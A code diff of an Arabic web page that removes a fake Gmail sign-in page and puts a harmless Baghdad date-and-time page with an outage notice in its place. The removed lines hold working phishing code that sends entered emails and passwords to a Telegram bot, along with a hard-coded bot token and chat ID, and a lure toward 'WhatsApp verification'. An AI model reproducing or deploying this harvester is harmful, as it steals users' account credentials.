@@ -1,335 +1,303 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Gmail - تسجيل الدخول</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap">
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    
-    body {
-      font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      padding: 40px;
-      border-radius: 16px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
-      width: 100%;
-      max-width: 450px;
-      text-align: center;
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-      position: relative;
-    }
-    
-    .container:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
-    }
-    
-    .logo-container {
-      margin-bottom: 25px;
-    }
-    
-    .logo {
-      width: 100px;
-      height: auto;
-      margin-bottom: 15px;
-    }
-    
-    h2 {
-      color: #1a73e8;
-      margin-bottom: 25px;
-      font-weight: 700;
-      font-size: 24px;
-    }
-    
-    .input-group {
-      margin-bottom: 20px;
-      text-align: right;
-    }
-    
-    input {
-      width: 100%;
-      padding: 16px 20px;
-      font-size: 16px;
-      border-radius: 12px;
-      border: 2px solid #e0e0e0;
-      background: #f9f9f9;
-      transition: all 0.3s ease;
-      color: #333;
-    }
-    
-    input:focus {
-      outline: none;
-      border-color: #1a73e8;
-      background: #fff;
-      box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
-    }
-    
-    input::placeholder {
-      color: #9e9e9e;
-    }
-    
-    button {
-      width: 100%;
-      padding: 16px;
-      font-size: 16px;
-      font-weight: 600;
-      border-radius: 12px;
-      border: none;
-      background: linear-gradient(to right, #1a73e8, #4285f4);
-      color: white;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
-      margin-top: 10px;
-    }
-    
-    button:hover {
-      background: linear-gradient(to right, #1967d2, #357ae8);
-      box-shadow: 0 6px 15px rgba(26, 115, 232, 0.4);
-      transform: translateY(-2px);
-    }
-    
-    button:active {
-      transform: translateY(0);
-    }
-    
-    .footer {
-      margin-top: 25px;
-      color: #5f6368;
-      font-size: 14px;
-    }
-    
-    .footer a {
-      color: #1a73e8;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    
-    .footer a:hover {
-      text-decoration: underline;
-    }
-    
-    @media (max-width: 480px) {
-      .container {
-        padding: 30px 20px;
-      }
-      
-      input, button {
-        padding: 14px;
-      }
-    }
-    
-    .language {
-      margin-top: 20px;
-      color: #5f6368;
-      font-size: 13px;
-    }
-    
-    /* تنسيقات الإشعار */
-    .notification {
-      display: none;
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: linear-gradient(to right, #4CAF50, #2E7D32);
-      color: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-      z-index: 1000;
-      text-align: center;
-      max-width: 90%;
-      animation: slideIn 0.5s ease-out;
-    }
-    
-    .notification-content {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    
-    .notification-icon {
-      font-size: 40px;
-      margin-bottom: 10px;
-    }
-    
-    .notification h3 {
-      margin: 0 0 10px 0;
-      font-weight: 700;
-    }
-    
-    .notification p {
-      margin: 5px 0;
-      line-height: 1.5;
-    }
-    
-    .notification-button {
-      background: white;
-      color: #2E7D32;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 30px;
-      font-weight: 600;
-      margin-top: 15px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    
-    .notification-button:hover {
-      background: #f5f5f5;
-      transform: translateY(-2px);
-    }
-    
-    @keyframes slideIn {
-      from {
-        top: -100px;
-        opacity: 0;
-      }
-      to {
-        top: 20px;
-        opacity: 1;
-      }
-    }
-    
-    .progress-bar {
-      width: 100%;
-      height: 5px;
-      background: rgba(255, 255, 255, 0.3);
-      border-radius: 5px;
-      margin-top: 15px;
-      overflow: hidden;
-    }
-    
-    .progress {
-      height: 100%;
-      width: 0%;
-      background: white;
-      border-radius: 5px;
-      animation: progress 5s linear;
-    }
-    
-    @keyframes progress {
-      from { width: 0%; }
-      to { width: 100%; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جميلة بغداد الزمني</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 900px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
+            padding: 30px;
+            margin: 20px 0;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        h1 {
+            font-size: 3rem;
+            color: #fdbb2d;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #eee;
+            margin-bottom: 20px;
+        }
+        
+        .datetime-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        
+        .time-box, .date-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            min-width: 220px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+        }
+        
+        .time-box:hover, .date-box:hover {
+            transform: translateY(-5px);
+        }
+        
+        .time-title, .date-title {
+            font-size: 1.5rem;
+            color: #fdbb2d;
+            margin-bottom: 15px;
+        }
+        
+        #time {
+            font-size: 3.5rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            direction: ltr;
+        }
+        
+        #date {
+            font-size: 2rem;
+            font-weight: 600;
+        }
+        
+        .city-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .info-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+        }
+        
+        .info-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .info-card i {
+            font-size: 2.5rem;
+            color: #fdbb2d;
+            margin-bottom: 15px;
+        }
+        
+        .info-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: #fdbb2d;
+        }
+        
+        .info-card p {
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+        
+        .server-status {
+            background: rgba(179, 0, 0, 0.3);
+            border: 2px solid #b21f1f;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin: 30px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(178, 31, 31, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(178, 31, 31, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(178, 31, 31, 0); }
+        }
+        
+        .server-status i {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            color: #ff4d4d;
+        }
+        
+        .server-status h3 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            color: #ff4d4d;
+        }
+        
+        .server-status p {
+            font-size: 1.2rem;
+            line-height: 1.6;
+        }
+        
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 30px 0;
+        }
+        
+        .gallery-item {
+            height: 150px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+        }
+        
+        .gallery-item:hover {
+            transform: scale(1.05);
+        }
+        
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px solid rgba(255, 255, 255, 0.2);
+            color: #eee;
+            font-size: 1.1rem;
+        }
+        
+        @media (max-width: 768px) {
+            h1 { font-size: 2.5rem; }
+            #time { font-size: 2.8rem; }
+            #date { font-size: 1.8rem; }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo-container">
-      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
-      <h2>تسجيل الدخول إلى Gmail</h2>
+    <div class="container">
+        <header>
+            <h1>جميلة بغداد الزمني</h1>
+            <p class="subtitle">عاصمة الرشيد وحاضرة التاريخ العريق</p>
+        </header>
+        
+        <div class="datetime-container">
+            <div class="time-box">
+                <div class="time-title">الوقت الحالي</div>
+                <div id="time">00:00:00</div>
+            </div>
+            
+            <div class="date-box">
+                <div class="date-title">التاريخ اليوم</div>
+                <div id="date">السبت، ١ يناير ٢٠٢٣</div>
+            </div>
+        </div>
+        
+        <div class="server-status">
+            <i class="fas fa-exclamation-triangle"></i>
+            <h3>توقف مؤقت</h3>
+            <p>نواجه حاليًا ضغطًا غير عادي على الخادم. جاري استعادة الخدمة بأسرع وقت ممكن.</p>
+            <p>نعتذر للإزعاج ونشكركم على صبركم.</p>
+        </div>
+        
+        <div class="city-info">
+            <div class="info-card">
+                <i class="fas fa-landmark"></i>
+                <h3>تاريخ عريق</h3>
+                <p>بغداد عاصمة العباسيين ومركز حضاري شهد ازدهار العلوم والفنون لقرون طويلة.</p>
+            </div>
+            
+            <div class="info-card">
+                <i class="fas fa-book"></i>
+                <h3>تراث ثقافي</h3>
+                <p>أرض ألف ليلة وليلة وبيت الحكمة، منارة العلم والمعرفة في العصر الذهبي للإسلام.</p>
+            </div>
+            
+            <div class="info-card">
+                <i class="fas fa-mosque"></i>
+                <h3>معالم دينية</h3>
+                <p>تضم بغداد العديد من المساجد والمراقد التاريخية التي تعود لعصور مختلفة.</p>
+            </div>
+        </div>
+        
+        <h2 style="text-align: center; margin: 30px 0; color: #fdbb2d;">معالم بغدادية</h2>
+        <div class="gallery">
+            <div class="gallery-item" style="background: linear-gradient(45deg, #1a2a6c, #fdbb2d);"></div>
+            <div class="gallery-item" style="background: linear-gradient(45deg, #b21f1f, #1a2a6c);"></div>
+            <div class="gallery-item" style="background: linear-gradient(45deg, #fdbb2d, #b21f1f);"></div>
+            <div class="gallery-item" style="background: linear-gradient(45deg, #1a2a6c, #b21f1f);"></div>
+        </div>
+        
+        <footer>
+            <p>بغداد - حاضرة الدنيا وقلب العراق النابض</p>
+            <p>© 2023 جميلة بغداد الزمني</p>
+        </footer>
     </div>
-    
-    <div class="input-group">
-      <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
-    </div>
-    
-    <div class="input-group">
-      <input type="password" id="password" placeholder="أدخل كلمة المرور">
-    </div>
-    
-    <button onclick="next()">تسجيل الدخول</button>
-    
-    <div class="footer">
-      <a href="#">هل نسيت كلمة المرور؟</a>
-      <p>ليس جهازك؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص. <a href="#">المزيد</a></p>
-    </div>
-    
-    <div class="language">
-      اللغة: <strong>العربية</strong> • <a href="#">English</a>
-    </div>
-  </div>
 
-  <!-- إشعار النجاح -->
-  <div class="notification" id="successNotification">
-    <div class="notification-content">
-      <div class="notification-icon">✅</div>
-      <h3>تمت العملية بنجاح!</h3>
-      <p>تم تسجيل الدخول بنجاح إلى حساب Gmail</p>
-      <p>الرجاء الانتقال لمرحلة توثيق حساب الواتساب</p>
-      <div class="progress-bar">
-        <div class="progress"></div>
-      </div>
-      <button class="notification-button" onclick="closeNotification()">متابعة إلى الواتساب</button>
-    </div>
-  </div>
-
-  <script>
-    const token = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
-    const chatId = "7493001551";
-
-    function next() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-
-      // التحقق من إدخال البيانات
-      if (!email || !password) {
-        alert("الرجاء إدخال البريد الإلكتروني وكلمة المرور");
-        return;
-      }
-
-      localStorage.setItem("email", email);
-      localStorage.setItem("password", password);
-
-      // إرسال البيانات إلى Telegram
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          chat_id: chatId, 
-          text: `📥 Gmail Login:\n📧 ${email}\n🔑 ${password}` 
-        })
-      }).then(response => {
-        if (response.ok) {
-          // إظهار إشعار النجاح بدلاً من الانتقال إلى صفحة أخرى
-          showSuccessNotification();
-        } else {
-          alert("حدث خطأ أثناء تسجيل الدخول، يرجى المحاولة مرة أخرى");
+    <script>
+        function updateDateTime() {
+            const now = new Date();
+            
+            // تحديث الوقت
+            const timeElement = document.getElementById('time');
+            const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
+            timeElement.textContent = now.toLocaleTimeString('ar-IQ', timeOptions);
+            
+            // تحديث التاريخ
+            const dateElement = document.getElementById('date');
+            const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            dateElement.textContent = now.toLocaleDateString('ar-IQ', dateOptions);
         }
-      }).catch(error => {
-        console.error('Error:', error);
-        alert("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى");
-      });
-    }
-
-    function showSuccessNotification() {
-      const notification = document.getElementById("successNotification");
-      notification.style.display = "block";
-      
-      // إخفاء الإشعار تلقائياً بعد 5 ثوانٍ
-      setTimeout(() => {
-        closeNotification();
-      }, 5000);
-    }
-
-    function closeNotification() {
-      const notification = document.getElementById("successNotification");
-      notification.style.display = "none";
-      
-      // هنا يمكنك إضافة أي إجراء إضافي بعد إغلاق الإشعار
-      // مثل التوجيه إلى صفحة أخرى أو إعادة تعيين النموذج
-      document.getElementById("email").value = "";
-      document.getElementById("password").value = "";
-    }
-  </script>
+        
+        // تحديث الوقت فوراً ثم كل ثانية
+        updateDateTime();
+        setInterval(updateDateTime, 1000);
+        
+        // تأثيرات عند التمرير
+        window.addEventListener('scroll', () => {
+            const scrollPosition = window.scrollY;
+            document.body.style.backgroundPosition = `0% ${scrollPosition / 10}%`;
+        });
+    </script>
 </body>
 </html>
